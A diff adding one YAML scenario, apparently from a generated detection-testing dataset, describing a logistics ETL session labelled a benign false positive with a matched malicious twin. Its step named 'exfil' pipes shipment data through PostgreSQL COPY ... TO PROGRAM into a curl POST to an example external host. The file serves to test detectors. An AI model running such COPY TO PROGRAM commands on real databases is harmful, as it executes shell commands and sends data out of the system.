@@ -1,0 +1,32 @@
+scenario_id: gen_logistics_57_sql_injection_ben_1504b
+family_id: gen_logistics_57_sql_injection_fam_1504
+domain: logistics
+time_of_day: '12:10'
+default_class: benign
+rule_engine_relationship: benign_false_positive
+sessions:
+- session_label: inject
+  role: partner_etl_service
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 5.0
+  events:
+  - step_id: probe
+    sql: SELECT shipment_id, status FROM shipments WHERE shipment_id = 62155
+  - step_id: exfil
+    sql: COPY (SELECT shipment_id, status FROM shipments WHERE depot_id = 'DP-02')
+      TO PROGRAM 'curl -sX POST https://clearinghouse-batch.example/ingest -d @-'
+    connects_to:
+      ip: 203.0.113.86
+      port: 8443
+matched_pair_id: gen_logistics_57_sql_injection_pair_1504
+matched_dimensions:
+  fixed:
+  - process_tree_shape
+  - syscall_sequence
+  - timing_pattern
+  - role
+  varied:
+  - sql_content
